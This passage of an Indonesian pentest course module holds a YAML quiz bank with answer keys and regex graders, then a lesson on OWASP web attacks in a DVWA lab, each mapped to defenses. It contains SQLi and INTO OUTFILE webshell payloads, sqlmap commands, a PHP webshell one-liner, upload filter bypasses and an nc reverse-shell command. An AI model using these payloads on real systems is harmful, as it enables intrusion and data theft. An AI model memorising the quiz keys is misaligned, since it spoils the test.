    patterns: ['into (outfile|dumpfile)', '(tulis|write)[^\n]*(file|webshell)[^\n]*(direktori web|webroot|server)', 'file privilege|secure_file_priv']
    tests:
      fail: ['sqli tidak bisa menulis file', 'hanya membaca data', 'tidak ada teknik rce dari sqli', 'select saja']
    explanation: 'SQLi di MySQL dengan hak cukup bisa eskalasi ke RCE via `SELECT ... INTO OUTFILE ''/var/www/html/shell.php''` — **menulis webshell** ke direktori web, lalu akses webshell → RCE (a08). Syarat: DB user punya `FILE` privilege dan `secure_file_priv` tidak membatasi. Juga `INTO DUMPFILE` untuk biner. Ini menghubungkan SQLi (data) ke eksekusi kode (RCE). Pelajaran blue terang (board DevSecOps modul 07): **DB user hak-minimal** (jangan beri `FILE`/superuser ke app) membatasi SQLi yang lolos agar tak bisa menulis file/RCE — mengubah "SQLi = total pwn" jadi "SQLi = baca data terbatas". Least privilege pada DB = blast radius mengecil.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b08
    tier: B
    type: command
    objective: tools
    prompt: Jalankan sqlmap terhadap form POST login, kirim data `user=a&pass=a` dan uji parameter user.
    answers: ['sqlmap -u "http://192.168.56.101/login" --data="user=a&pass=a" -p user']
    patterns: ['^(?=.*--data=)(?=.*-p[ \t]+\S+)sqlmap[ \t].*-u[ \t]+\S+', '^(?=.*--data=)sqlmap[ \t]']
    tests:
      pass:
        - 'sqlmap -u "http://192.168.56.101/login" --data="user=a&pass=a" -p user'
        - 'sqlmap -u http://192.168.56.101/login --data="user=a&pass=a"'
      fail:
        - 'sqlmap -u "http://192.168.56.101/login?user=a"'
        - 'sqlmap --data user=a'
        - 'curl -d user=a http://192.168.56.101/login'
    explanation: 'Banyak form login/kirim data pakai **POST**, bukan GET — sqlmap menanganinya dengan `--data="<body>"` (dan `-p <param>` untuk fokus parameter tertentu). `sqlmap -u <url> --data="user=a&pass=a" -p user` menguji SQLi di field `user` dari form POST. Cara mendapat request lengkap: ambil dari Burp (a06) lalu `-r request.txt` (sqlmap membaca request mentah Burp — sangat praktis untuk request kompleks dengan header/cookie/CSRF token). Untuk area ber-login: `--cookie=`. Ini menunjukkan SQLi tak terbatas pada parameter URL — form POST, header, cookie semua bisa jadi titik injeksi. Uji semua input (modul 03: enumerasi parameter).'
    source: https://sqlmap.org/

  - id: b09
    tier: B
    type: text
    objective: purple
    prompt: WAF memblokir payload SQLi-mu yang sederhana. Apa artinya bagi red DAN apa pelajarannya bagi blue?
    answers: ['red: coba teknik evasi (encoding/case/komentar) tapi WAF bukan jaminan; blue: WAF adalah lapisan yang meredam & memberi waktu, TAPI akar tetap harus diperbaiki di kode (prepared statement)']
    patterns: ['(evasi|encoding|komentar|variasi case)[^\n]*(bypass|lewati|waf)', 'waf[^\n]*(lapisan|meredam|bukan (jaminan|pengganti))', '(akar|kode|prepared statement)[^\n]*(tetap|harus)[^\n]*(diperbaiki|ditutup|fix)']
    tests:
      fail: ['waf tidak bisa dibypass', 'waf menggantikan perbaikan kode', 'red menyerah total', 'blue cukup pasang waf']
    explanation: 'WAF memblokir SQLi (seperti di lab biru board DevSecOps modul 07: payload → 403). **Red**: coba **evasi** (encoding URL/hex, variasi case `UnIoN`, komentar inline `/**/`, payload setara) — kadang berhasil, karena WAF berbasis pola bisa dilewati; tapi WAF memperlambat & menambah risiko terdeteksi. **Blue**: WAF adalah **lapisan** yang meredam serangan massal & memberi waktu (board DevSecOps modul 07: WAF = lapisan, bukan obat) — TAPI app di baliknya tetap rentan bila diakses langsung/di-bypass, jadi **akar tetap diperbaiki di kode** (prepared statement). Inilah purple paling jelas: WAF yang menghentikanmu sebagai red mengajarkan blue bahwa WAF berguna tapi tak cukup sendiri.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b10
    tier: B
    type: text
    objective: cmdinj
    prompt: Selain `;`, sebutkan karakter/teknik lain untuk menggabungkan/menyisipkan perintah pada command injection.
    answers: ['pipe |, && atau ||, backtick `cmd`, $(cmd), newline — semua menyisipkan/menggabung perintah tambahan']
    patterns: ['\|\||&&|\bpipe\b|\|', 'backtick|`|\$\(', 'newline|%0a|&&|\|\|']
    tests:
      fail: ['hanya titik koma', 'tidak ada karakter lain', 'command injection tidak pakai karakter khusus', 'spasi saja']
    explanation: 'Metakarakter shell untuk command injection selain `;` (jalankan berurutan): **`|`** (pipe output ke perintah lain), **`&&`** (jalankan jika sukses), **`||`** (jika gagal), **`` `cmd` ``** & **`$(cmd)`** (command substitution — jalankan & sisipkan hasil), **newline** (`%0a`), **`&`** (background). Berguna karena blacklist yang hanya memblokir `;` bisa dilewati dengan `|` atau `$()`. DVWA Command Injection melatih bypass filter bertingkat. Pelajaran blue (board DevSecOps modul 07): **jangan blacklist karakter** (selalu ada yang terlewat) — jangan bangun perintah dari input sama sekali; pakai API berargumen (`subprocess` dengan list, bukan shell=True) + allowlist ketat. Akar, bukan filter karakter.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b11
    tier: B
    type: text
    objective: upload
    prompt: Setelah webshell berjalan (RCE via upload), apa langkah logis berikutnya menuju kontrol penuh?
    answers: ['tingkatkan ke reverse shell interaktif, lalu orientasi (id/uname) & privilege escalation jika bukan root (post-exploitation)']
    patterns: ['(reverse shell|shell interaktif|upgrade shell)', '(orientasi|\bid\b|whoami|uname)', '(privilege escalation|privesc|eskalasi)[^\n]*(root|hak)?|post-?ex']
    tests:
      fail: ['langsung selesai', 'reboot server', 'hapus semua file', 'tidak ada langkah lanjut']
    explanation: 'Webshell memberi RCE tapi tak nyaman (satu perintah per request, tanpa interaktivitas). Langkah logis: **tingkatkan ke reverse shell interaktif** (`?c=` + payload nc/bash, b03) → tangkap dengan listener → **orientasi** (`id`, `whoami`, `uname -a`, modul 05 a13) → jika bukan root, **privilege escalation** (modul 08: kernel exploit, sudo misconfig, SUID) → lalu persistence/pivot/loot. Ini transisi dari "akses awal lewat web" ke "kontrol host penuh" (post-exploitation). Sisi blue: tiap langkah punya counter — non-root (RCE terbatas), egress deny (reverse shell gagal), deteksi runtime (shell/koneksi), hardening (privesc gagal). Web RCE adalah pijakan, bukan akhir.'
    source: https://attack.mitre.org/techniques/T1190/

  - id: b12
    tier: B
    type: text
    objective: clientside
    prompt: Mengapa IDOR (akses objek orang lain dengan ganti id) sering tak tertangkap scanner & butuh uji manual?
    answers: ['idor adalah kelemahan logika otorisasi, bukan pola teknis — scanner tak tahu objek mana milik siapa; perlu manusia menguji dengan dua akun/konteks']
    patterns: ['(logika|otorisasi|authorization|business logic)[^\n]*(bukan pola|kontekstual|milik siapa)', 'scanner[^\n]*(tak tahu|tidak bisa|susah)[^\n]*(objek|milik|otorisasi|konteks)', '(uji manual|dua akun)[^\n]*(idor|otorisasi|objek|login|konteks|akun)']
    tests:
      fail: ['idor mudah dideteksi scanner', 'idor adalah pola teknis sederhana', 'tidak butuh uji manual', 'scanner menemukan semua idor']
    explanation: 'IDOR (ganti `id=1`→`id=2` untuk baca data orang lain — board DevSecOps modul 07) adalah **kelemahan logika otorisasi**, bukan pola teknis seperti SQLi (yang punya signature). Scanner otomatis tak tahu "objek mana seharusnya milik siapa" — itu butuh **konteks bisnis**. Jadi IDOR butuh **uji manual**: login dengan dua akun, catat id milik akun A, coba akses dari akun B (via Burp, a06), lihat apakah tembus. Inilah kenapa pentest manual tetap perlu meski ada scanner (modul 04 b03). Pelajaran blue (board DevSecOps modul 07): otorisasi **per objek, server-side, deny-by-default** — dan uji otorisasi secara eksplisit (tak bisa diandalkan ke scanner). Logic flaw = wilayah manusia, bukan tool.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: b13
    tier: B
    type: text
    objective: tools
    prompt: Mengapa penting memahami serangan web secara manual dulu sebelum mengandalkan sqlmap/scanner?
    answers: ['agar paham apa yang terjadi, bisa menyesuaikan saat tool gagal/diblokir, menghindari false positive, dan mengenali kasus yang butuh kreativitas manual']
    patterns: ['(paham|mengerti)[^\n]*(apa yang terjadi|cara kerja|mekanisme)', '(tool|sqlmap|scanner)[^\n]*(gagal|diblokir|tak bisa)[^\n]*(sesuaikan|manual)', '(false positive|logic flaw|kreativitas|kasus)[^\n]*(manual|manusia)?']
    tests:
      fail: ['tool selalu cukup', 'manual tidak perlu', 'sqlmap menggantikan pemahaman', 'scanner menemukan semua']
    explanation: 'Memahami manual dulu (a01/a02/b01) sebelum mengotomasi penting karena: kamu **paham apa yang terjadi** (bukan sekadar menekan tombol), bisa **menyesuaikan saat tool gagal/diblokir** (WAF, SQLi aneh, parameter tersembunyi), **menghindari false positive** (verifikasi temuan, modul 04), dan **mengenali kasus yang butuh kreativitas** (logic flaw/IDOR, b12 — tak ada tombol otomatisnya). sqlmap/Burp Intruder mempercepat yang rutin; pemahaman menangani yang tak rutin. Pentester yang hanya "jalankan sqlmap" buntu saat tool gagal. Ini juga membuat laporanmu kredibel (paham akar & dampak). Otomasi memperkuat skill, bukan menggantikannya.'
    source: https://sqlmap.org/

  - id: b14
    tier: B
    type: text
    objective: purple
    prompt: "Ringkas peta purple: tiga serangan web utama (SQLi, command injection, upload→webshell) ke pertahanan blue-nya."
    answers: ['sqli → prepared statement + DB least-priv; command injection → API berargumen/validasi + non-root; upload → allowlist tipe + direktori non-executable; semua + WAF & deteksi']
    patterns: ['sqli[^\n]*prepared statement', '(command injection|injeksi perintah)[^\n]*(api berargumen|validasi|non-?root)', '(upload)[^\n]*(allowlist|non-?executable|validasi tipe)']
    tests:
      fail: ['semua pakai satu pertahanan', 'tidak bisa dipetakan', 'hanya waf untuk semua', 'tidak ada pertahanan']
    explanation: 'Peta purple serangan web (board DevSecOps modul 07): **SQLi** → prepared statement (akar) + DB user hak-minimal (batasi dampak) + WAF (lapisan). **Command injection** → API berargumen bukan shell string + validasi/allowlist input + non-root (modul 06, batasi dampak). **File upload** → allowlist tipe/konten + direktori non-executable + rename + simpan luar webroot. **Semua** dilengkapi: output encoding (XSS), validasi server-side (client tak dipercaya, a12), WAF (meredam), egress deny (gagalkan reverse shell), dan deteksi/log (modul 09). Satu prinsip pemersatu: pisahkan kode dari data + jangan percaya input + batasi dampak. Kamu melihatnya dari sisi red di modul ini; board DevSecOps membangunnya dari sisi blue.'
    source: https://owasp.org/www-project-top-ten/

  - id: b15
    tier: B
    type: text
    objective: sqli
    prompt: Di lab penulis, SQLi UNION mengekstrak password admin "S3cr3tHash!". Di dunia nyata, kenapa password sebaiknya di-hash kuat meski SQLi idealnya dicegah?
    answers: ['defense-in-depth: jika SQLi/kebocoran DB toh terjadi, hash kuat+salt (bcrypt/argon2) membuat password jauh lebih sulit di-crack — melindungi data itu sendiri']
    patterns: ['defense[- ]in[- ]depth|berlapis|lapisan', '(jika|kalau)[^\n]*(sqli|bocor|kebobolan)[^\n]*(toh|tetap) (terjadi)?', '(hash kuat|bcrypt|argon2|salt)[^\n]*(sulit|susah)[^\n]*crack']
    tests:
      fail: ['hashing tidak perlu jika ada prepared statement', 'password plaintext aman', 'satu pertahanan cukup', 'hashing tidak membantu saat bocor']
    explanation: 'Prepared statement mencegah SQLi (akar), TAPI defense-in-depth mengasumsikan "sesuatu bisa jebol" (assume breach, board DevSecOps modul 01): jika SQLi lolos ATAU DB bocor lewat jalur lain (backup hilang, misconfig), **hash password yang kuat + unik salt** (bcrypt/argon2/scrypt — bukan MD5/plaintext) membuat kredensial yang diekstrak jauh lebih sulit/mahal di-crack. Di lab penulis password tampil sebagai teks (sengaja, untuk demo) — di produksi harus hash. Ini melindungi **data itu sendiri** sebagai lapisan terakhir. Pelajaran: jangan hanya cegah akses (prepared statement), tapi juga lindungi nilai data bila akses toh bocor. Berlapis sampai ke level data.'
    source: https://owasp.org/www-project-web-security-testing-guide/

  # ---------------------------------------------------------------- Tier C
  - id: c01
    tier: C
    type: scenario
    objective: sqli
    prompt: |
      Enumerasi menemukan DVWA di Metasploitable dengan form login & halaman "SQL Injection". Rancang langkah
      mengeksploitasi SQLi dari manual sampai ekstraksi data (satu poin per baris).
    checklist:
      - id: confirm
        label: Konfirmasi SQLi (mis. input ' memicu error, atau ' OR '1'='1 mengubah hasil)
        required: true
        patterns: ["(konfirmasi|uji|cek)[^\\n]*(sqli|injeksi)", "('|or '1'='1|tanda kutip|error)[^\\n]*(error|berubah|bypass)"]
      - id: columns
        label: Tentukan jumlah kolom (ORDER BY / UNION SELECT NULL...)
        patterns: ['order by|union select null', 'jumlah kolom']
      - id: union
        label: Ekstrak data via UNION SELECT (nama DB, tabel, kolom, kredensial)
        required: true
        patterns: ['union select', '(ekstrak|ambil|dump)[^\n]*(data|kredensial|tabel|kolom)']
      - id: automate
        label: Otomatiskan/percepat dengan sqlmap (--dbs/--dump) bila perlu
        patterns: ['sqlmap', '--dbs|--dump|-D[^\n]*-T']
      - id: document
        label: Dokumentasikan dampak (data apa yang bisa diekstrak) untuk laporan
        patterns: ['dokumentasi|catat|laporan', '(dampak|data)[^\n]*(ekstrak|bocor)']
      - id: defense
        label: Catat pertahanan blue (prepared statement + DB least-priv + hash kuat)
        patterns: ['prepared statement', '(db|database)[^\n]*(least|hak minimal)|hash (kuat|bcrypt)|waf']
      - id: no-random
        label: Tidak langsung sqlmap membabi buta tanpa paham/konfirmasi
        forbid: true
        patterns: ['^(?![^\n]*(jangan|bukan|tidak|selain|sebelum))[^\n]*(langsung|asal)[^\n]*sqlmap[^\n]*(semua|membabi|tanpa)']
    pass_score: 0.5
    solution: |
      ```text
      1. Konfirmasi SQLi: input `'` → error SQL, atau `' OR '1'='1` → hasil berubah (semua baris). (lab: terbukti.)
      2. Tentukan jumlah kolom: `' ORDER BY N--` naik sampai error, atau `' UNION SELECT NULL,NULL...--`.
      3. Ekstrak via UNION: `' UNION SELECT user,password FROM users--` → kredensial. (lab: dapat password admin.)
         Enumerasi DB/tabel dulu bila perlu (information_schema / sqlmap).
      4. Otomatiskan: sqlmap -u "..." --dbs → --tables → --dump (unggul untuk blind SQLi).
      5. Dokumentasikan dampak: "tabel users (N kredensial) bisa diekstrak" — bukti untuk laporan (modul 10).
      6. (Blue) pertahanan: prepared statement (akar) + DB user hak-minimal + hash password kuat (bcrypt) + WAF (lapisan).
      ```
      Alur: konfirmasi → tentukan kolom → UNION ekstrak → otomasi bila perlu → dokumentasi + pertahanan. Jangan asal
      sqlmap tanpa paham — tool mempercepat yang kamu mengerti, bukan pengganti pemahaman.
    tests:
      pass:
        - |
          konfirmasi sqli dengan input tanda kutip yang memicu error atau or 1=1 yang mengubah hasil
          tentukan jumlah kolom dengan order by atau union select null
          ekstrak data via union select untuk nama db tabel kolom dan kredensial
          otomatiskan dengan sqlmap --dbs dan --dump bila perlu
          dokumentasikan dampak data apa yang bisa diekstrak untuk laporan
          catat pertahanan blue prepared statement db least privilege dan hash kuat
          jangan langsung sqlmap membabi buta tanpa konfirmasi
        - |
          konfirmasi sqli dulu lalu order by untuk kolom, union select ekstrak kredensial
          sqlmap untuk percepat dump, dokumentasikan dampak, pertahanan prepared statement dan db hak minimal plus hash bcrypt
      fail:
        - |
          langsung jalankan sqlmap membabi buta tanpa konfirmasi atau paham
          tidak perlu dokumentasi atau pertahanan
        - |
          tebak payload acak tanpa tentukan kolom
          pertahanan tidak penting
        - |
          dump semua tanpa catat dampak
          prepared statement tidak relevan
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: c02
    tier: C
    type: scenario
    objective: upload
    prompt: |
      DVWA File Upload menerima file, dan Command Injection menerima input "host". Rancang cara merantai kerentanan web
      ini menjadi akses shell penuh di server — plus pertahanannya (satu poin per baris).
    checklist:
      - id: webshell
        label: Unggah webshell (.php atau bypass filter) via File Upload
        required: true
        patterns: ['(unggah|upload)[^\n]*(webshell|\.php|shell)', 'bypass[^\n]*(filter|ekstensi)|phtml|double extension']
      - id: access
        label: Akses webshell via URL untuk RCE (shell.php?c=id)
        required: true
        patterns: ['(akses|panggil)[^\n]*(webshell|shell\.php)[^\n]*(url|c=)', 'shell\.php\?c=|rce']
      - id: reverseshell
        label: Tingkatkan ke reverse shell interaktif (nc/bash ke Kali)
        patterns: ['reverse shell', '(nc|bash -i|/dev/tcp)[^\n]*(kali|listener|4444)']
      - id: orient
        label: Orientasi (id/whoami/uname) → siapa & OS untuk langkah berikut
        patterns: ['id|whoami|uname', 'orientasi|siapa|os']
      - id: defense
        label: Pertahanan - validasi upload (allowlist) + direktori non-executable + command injection di-fix + non-root + egress deny
        required: true
        patterns: ['(allowlist|validasi)[^\n]*(upload|tipe)|non-?executable', '(command injection|perintah)[^\n]*(fix|api berargumen|validasi)', 'non-?root|egress deny']
      - id: no-destroy
        label: Tidak merusak/menghapus data target (do no harm, lab)
        forbid: true
        patterns: ['^(?![^\n]*(jangan|bukan|tidak|hindari))[^\n]*(rm -rf|hapus semua|rusak|format|wipe)[^\n]*(target|data|server)']
    pass_score: 0.5
    solution: |
      ```text
      MERANTAI SERANGAN (chaining):
        1. Unggah webshell via File Upload — langsung .php bila tanpa cek, atau bypass filter (.phtml, double ext,
           content-type palsu) bila ada cek (b02).
        2. Akses webshell: curl ".../uploads/shell.php?c=id" → RCE terkonfirmasi (lab: command injection → uid=0 root).
           [Alternatif tanpa upload: command injection langsung via input host, a03.]
        3. Tingkatkan ke reverse shell interaktif (?c= payload nc/bash ke Kali + listener, b03).
        4. Orientasi: id/whoami/uname-a → tentukan apakah root / perlu privesc (modul 08).
      PERTAHANAN (blue, board DevSecOps modul 07):
        - Upload: allowlist tipe/konten, direktori non-executable, rename, simpan luar webroot.
        - Command injection: API berargumen (bukan shell dari input), validasi allowlist.
        - Non-root (RCE terbatas) + egress deny (reverse shell gagal) + deteksi webshell/koneksi (modul 09).
      ```
      Chaining = gabungkan kerentanan jadi dampak besar (upload→RCE→shell→privesc). Pertahanan berlapis memutus rantai
      di banyak titik. Tetap do no harm — buktikan akses, jangan rusak data (lab).
    tests:
      pass:
        - |
          unggah webshell php atau bypass filter via fitur file upload
          akses webshell via url untuk rce seperti shell.php?c=id
          tingkatkan ke reverse shell interaktif dengan nc atau bash ke kali
          orientasi dengan id whoami dan uname untuk tahu siapa dan os
          pertahanan validasi upload allowlist dan direktori non executable plus fix command injection non root dan egress deny
          jangan merusak atau menghapus data target do no harm
        - |
          upload webshell dengan bypass filter, akses via url shell.php c=id untuk rce
          upgrade ke reverse shell nc ke kali, orientasi id uname
          pertahanan allowlist upload direktori non executable api berargumen non root egress deny, jangan rusak data
      fail:
        - |
          unggah webshell lalu rm -rf semua data server
          tidak perlu pertahanan
        - |
          langsung format target setelah dapat shell
          tidak usah orientasi
        - |
          rusak database target untuk bukti
          pertahanan tidak penting
    source: https://owasp.org/www-project-web-security-testing-guide/

  - id: c03
    tier: C
    type: scenario
    objective: purple
    prompt: |
      Purple: kamu baru mengeksploitasi SQLi, command injection, dan XSS di aplikasi web lab. Rancang rekomendasi
      pertahanan menyeluruh untuk tim BLUE (dipetakan ke board DevSecOps modul 07) (satu poin per baris).
    checklist:
      - id: separate
        label: Pisahkan kode dari data - prepared statement (SQLi), API berargumen (cmd inj), output encoding (XSS)
        required: true
        patterns: ['prepared statement', 'api berargumen|bukan shell[^\n]*input', 'output encoding|escap']
      - id: validate
        label: Validasi input server-side (allowlist), jangan percaya klien
        required: true
        patterns: ['validasi[^\n]*(input|server)', 'allowlist|whitelist', '(jangan|tidak) percaya[^\n]*(klien|client)']
      - id: authz
        label: Otorisasi server-side per objek (IDOR) + deny-by-default
        patterns: ['otorisasi[^\n]*(server|objek)', 'idor|deny-?by-?default|per objek']
      - id: headers-waf
        label: Security headers (CSP/HttpOnly) + WAF sebagai lapisan
        patterns: ['csp|httponly|security header', 'waf']
      - id: leastpriv
        label: DB user hak-minimal + non-root + hash password kuat (batasi dampak)
        patterns: ['(db|database)[^\n]*(hak minimal|least)', 'non-?root', 'hash (kuat|bcrypt|argon)']
      - id: monitor
        label: Logging & deteksi (sqlmap/scan = banyak request, webshell = file+param baru)
        patterns: ['(log|deteksi|monitor|siem)[^\n]*(request|scan|webshell|anomali|serangan)', 'rate limit']
      - id: no-wafonly
        label: Tidak mengandalkan WAF saja tanpa memperbaiki akar di kode
        forbid: true
        patterns: ['^(?![^\n]*(jangan|bukan|tidak|selain|tetap))[^\n]*(cukup|hanya|andalkan)[^\n]*waf[^\n]*(saja|cukup|tanpa)']
    pass_score: 0.5
    solution: |
      ```text
      1. Pisahkan kode dari data (akar semua injection): prepared statement (SQLi), API berargumen bukan shell (cmd inj),
         output encoding kontekstual (XSS) — board DevSecOps modul 07.
      2. Validasi input server-side dengan allowlist; JANGAN percaya klien (penyerang pakai curl/Burp, a12).
      3. Otorisasi server-side per objek + deny-by-default → tutup IDOR/broken access control.
      4. Security headers (CSP, X-Content-Type-Options, X-Frame-Options; cookie HttpOnly/Secure/SameSite) + WAF (lapisan).
      5. Batasi dampak: DB user hak-minimal (SQLi lolos tak bisa dump semua/RCE), non-root (RCE terbatas), hash password kuat.
      6. Logging & deteksi: banyak request (sqlmap/scan), 403 WAF, file upload baru + akses param perintah = IOC (modul 09);
         rate limit (modul 08).
      ```
      Satu prinsip pemersatu: pisahkan kode-data + jangan percaya input + batasi dampak + deteksi. WAF membantu tapi
      BUKAN pengganti perbaikan kode — app tetap jebol bila diakses langsung/di-bypass (b09).
    tests:
      pass:
        - |
          pisahkan kode dari data prepared statement untuk sqli api berargumen untuk command injection dan output encoding untuk xss
          validasi input server side dengan allowlist dan jangan percaya klien
          otorisasi server side per objek dan deny by default untuk idor
          pasang security headers csp httponly dan waf sebagai lapisan
          db user hak minimal non root dan hash password kuat untuk batasi dampak
          logging dan deteksi karena sqlmap dan scan banyak request dan webshell file baru plus rate limit
          jangan mengandalkan waf saja tanpa memperbaiki akar di kode
        - |
          prepared statement api berargumen dan output encoding, validasi server side allowlist jangan percaya client
          otorisasi per objek, headers dan waf lapisan, db least privilege non root hash kuat, logging deteksi, bukan waf saja
      fail:
        - |
          cukup pasang waf saja tanpa perbaiki kode
          validasi di javascript klien sudah cukup
        - |
          andalkan waf dan selesai
          tidak perlu prepared statement atau encoding
        - |
          percaya validasi client side
          db pakai user root saja biar gampang
    source: https://owasp.org/www-project-top-ten/
---

# Eksploitasi Web (OWASP)

Sisi **penyerang** dari board DevSecOps modul 07. Aplikasi web rentan Metasploitable (DVWA, Mutillidae) adalah tempat
berlatih kelas OWASP dari sisi red — lalu tiap serangan dipetakan ke pertahanan blue yang sudah kamu bangun.

> [!NOTE]
> Inti eksploitasi **diverifikasi penulis** (sisi penyerang via curl, app PHP rentan): SQLi auth bypass (`'' OR ''1''=''1`
> → dump semua user), SQLi UNION (ekstrak password admin `S3cr3tHash!`), OS command injection (`host=127.0.0.1; id`
> → `uid=0(root)`). Spesifik DVWA/Mutillidae, file-upload, Burp, sqlmap **didokumentasikan** — kamu jalankan di
> Metasploitable (versi app beda, teknik identik). Semua pada target milik sendiri.

## 1. SQL Injection (hasil lab)

```text
' OR '1'='1          → WHERE selalu benar → dump semua user (auth bypass)
' UNION SELECT name,pass FROM users--   → ekstrak kredensial (lab: password admin)
blind (boolean/time-based)              → simpulkan data per-bit (lambat → sqlmap)
sqlmap -u "url?id=1" --dbs/--dump       → otomasi penuh (dbs→tables→columns→dump)
```

## 2. OS Command Injection (hasil lab)

```text
host=127.0.0.1; id        → "uid=0(root)"   (perintah ikut dieksekusi)
metakarakter: ; | && || `cmd` $(cmd) newline
host=...; nc <kali> 4444 -e /bin/sh   → reverse shell interaktif (lanjut post-ex)
```

## 3. File Upload → Webshell → RCE

Unggah `shell.php` (`<?php system($_GET["c"]); ?>`; bypass filter: `.phtml`, double-ext, content-type palsu) →
`curl ".../uploads/shell.php?c=id"` → RCE → tingkatkan ke reverse shell → orientasi → privesc (modul 08).

## 4. Client-side & logika

- **XSS** (di browser korban): curi sesi / aksi atas nama korban. Stored > Reflected > DOM.
- **CSRF**: tipu browser korban yang login mengirim request tak dikehendaki.
- **IDOR** (logika otorisasi): ganti `id` → data orang lain. Butuh **uji manual** (scanner tak paham konteks).
- **Client-side validation bisa dilewati** (curl/Burp) → keamanan WAJIB server-side.

## 5. Alat

**Burp Suite** (intercepting proxy — Repeater/Intruder, kontrol request mentah) · **sqlmap** (otomasi SQLi, unggul
untuk blind) · **curl** (request mentah). Pahami manual dulu, baru otomasi (tool gagal/diblokir → kamu menyesuaikan).

## 6. Purple — akar sama, pertahanan sepola (→ DevSecOps modul 07)

| Serangan (red) | Akar | Pertahanan (blue) |
|---|---|---|
| SQLi | data jadi kode SQL | prepared statement + DB least-priv + hash kuat |
| Command injection | data jadi perintah shell | API berargumen + validasi + non-root |
| File upload RCE | file jahat dieksekusi | allowlist tipe + direktori non-executable |
| XSS | data jadi kode di browser | output encoding + CSP + HttpOnly |
| IDOR | otorisasi tak dicek | otorisasi server-side per objek, deny-by-default |
| (semua) | percaya input/klien | validasi server-side + WAF (lapisan) + deteksi (09) |

> [!WARNING]
> HANYA pada aplikasi web milik sendiri (DVWA/lab) di lab terisolasi (ATT&CK T1190). Do no harm: buktikan akses &
> dampak, jangan rusak/hapus data. WAF yang memblokirmu (red) mengajarkan blue: WAF itu lapisan, akar tetap di kode.

> [!NOTE]
> Lanjut ke modul 07 (Password Attacks) — Hydra, John the Ripper, dan hash cracking: memanfaatkan kredensial lemah
> (jalur bobol dunia-nyata #1) terhadap servis & hash yang kamu temukan.
